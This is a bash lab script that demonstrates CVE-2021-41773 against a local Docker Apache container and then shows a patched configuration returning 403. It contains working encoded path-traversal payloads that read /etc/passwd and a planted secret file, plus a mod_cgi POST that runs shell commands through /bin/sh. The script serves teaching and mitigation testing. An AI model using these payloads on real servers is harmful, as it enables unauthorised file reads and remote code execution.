#!/usr/bin/env bash
#  CVE-2021-41773  —  Full Demo Script
#  Stages:
#    0. Setup check
#    1. Sanity test (normal request)
#    2. Path traversal  - read /etc/passwd
#    3. Path traversal  - read custom secret file
#    4. RCE via mod_cgi - execute id / whoami
#    5. Mitigation demo - patched config returns 403


TARGET="http://localhost:8080"
BASE_DIR="$(cd "$(dirname "$0")" && pwd)"
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; RESET='\033[0m'

banner() {
  echo ""
  echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════${RESET}"
  echo -e "${BOLD}${CYAN}  $1${RESET}"
  echo -e "${BOLD}${CYAN}══════════════════════════════════════════════════${RESET}"
}

pass() { echo -e "  ${GREEN}✔  $1${RESET}"; }
fail() { echo -e "  ${RED}✘  $1${RESET}"; }
info() { echo -e "  ${YELLOW}➜  $1${RESET}"; }

# STAGE 0: preflight 
banner "STAGE 0 — Preflight Checks"

command -v docker >/dev/null 2>&1 && pass "docker found" || { fail "docker not found — install Docker Desktop"; exit 1; }
command -v curl   >/dev/null 2>&1 && pass "curl found"   || { fail "curl not found"; exit 1; }

info "Cleaning up any previous lab containers..."
(cd "$BASE_DIR/vulnerable" && docker compose down >/dev/null 2>&1) || true
(cd "$BASE_DIR/patched" && docker compose down >/dev/null 2>&1) || true

info "Starting vulnerable container (this may take a minute on first run)..."
cd "$BASE_DIR/vulnerable" || exit 1
docker compose up -d --build

echo ""
info "Waiting for Apache to be ready..."
for i in $(seq 1 30); do
  curl -s -o /dev/null "$TARGET" && break
  sleep 1
done
pass "Apache is up at $TARGET"

# STAGE 1: sanity test
banner "STAGE 1 — Normal Request (Baseline)"
info "Request: GET /"
echo ""
curl -s -o /dev/null -w "  HTTP Status: %{http_code}\n" "$TARGET/"
pass "Normal requests work fine"

# STAGE 2: path traversal — /etc/passwd
banner "STAGE 2 — Path Traversal: Read /etc/passwd"
info "The encoded path: /static/.%%2e/.%%2e/.%%2e/.%%2e/etc/passwd"
info "Decoded:          /static/../../../../etc/passwd"
info "Why it works:     Apache 2.4.49 decodes %%2e AFTER access checks"
echo ""

RESULT=$(curl -s --path-as-is \
  "$TARGET/static/.%2e/.%2e/.%2e/.%2e/etc/passwd")

if echo "$RESULT" | grep -q "root:"; then
  pass "EXPLOITED — /etc/passwd contents:"
  echo ""
  echo "$RESULT" | head -5 | sed 's/^/    /'
  echo "    [... truncated ...]"
else
  fail "Exploit did not return expected output."
  echo "$RESULT"
fi

# STAGE 3: path traversal — custom secret 
banner "STAGE 3 — Path Traversal: Read Custom Secret File"
info "Target: /etc/secret_config.txt (planted during Docker build)"
echo ""

RESULT=$(curl -s --path-as-is \
  "$TARGET/static/.%2e/.%2e/.%2e/.%2e/etc/secret_config.txt")

if echo "$RESULT" | grep -q "SECRET"; then
  pass "EXPLOITED — Secret file contents:"
  echo ""
  echo "$RESULT" | sed 's/^/    /'
else
  fail "Could not read secret file."
fi

# STAGE 4: RCE via mod_cgi 
banner "STAGE 4 — RCE Escalation via mod_cgi"
info "mod_cgi allows scripts to be executed via CGI."
info "By traversing to /bin/sh and POSTing shell commands,"
info "we get arbitrary code execution on the server."
echo ""
info "Executing: id; whoami; hostname; uname -a"
echo ""

RESULT=$(curl -s --path-as-is \
  -d "echo Content-Type: text/plain; echo; id; whoami; hostname; uname -a" \
  "$TARGET/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh")

if echo "$RESULT" | grep -q "uid="; then
  pass "RCE CONFIRMED — Command output:"
  echo ""
  echo "$RESULT" | sed 's/^/    /'
else
  fail "RCE attempt did not return uid output."
  echo "$RESULT"
fi

# STAGE 5: mitigation 
banner "STAGE 5 — Mitigation: Patched Configuration"
info "Stopping vulnerable container, starting patched container..."
docker compose down || true

cd ../patched || exit 1
docker compose up -d --build

if docker ps --format '{{.Names}}' | grep -qx "apache-cve-2021-41773"; then
  fail "Vulnerable container is still running; cannot validate mitigation"
  exit 1
fi

if ! docker ps --format '{{.Names}}' | grep -qx "apache-cve-patched"; then
  fail "Patched container failed to start"
  docker compose ps
  exit 1
fi

echo ""
info "Waiting for patched Apache..."
for i in $(seq 1 15); do
  curl -s -o /dev/null "$TARGET" && break
  sleep 1
done
pass "Patched Apache is up"

echo ""
info "Running the same exploit against patched server..."
echo ""

HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --path-as-is \
  "$TARGET/static/.%2e/.%2e/.%2e/.%2e/etc/passwd")

if [ "$HTTP_CODE" = "403" ]; then
  pass "BLOCKED — Server returned HTTP 403 Forbidden"
  pass "The same payload is now rejected by the patched config"
else
  fail "Expected 403 but got: $HTTP_CODE"
fi

# Done 
banner "Demo Complete"
pass "All stages finished."
info "Stopping containers..."
docker compose down
echo ""
echo -e "  ${BOLD}Summary:${RESET}"
echo "  Stage 1  Normal request           → 200 OK"
echo "  Stage 2  Traversal /etc/passwd    → FILE CONTENTS"
echo "  Stage 3  Traversal secret file    → FILE CONTENTS"
echo "  Stage 4  RCE via /bin/sh POST     → COMMAND EXECUTED"
echo "  Stage 5  Patched config           → 403 BLOCKED"
echo ""
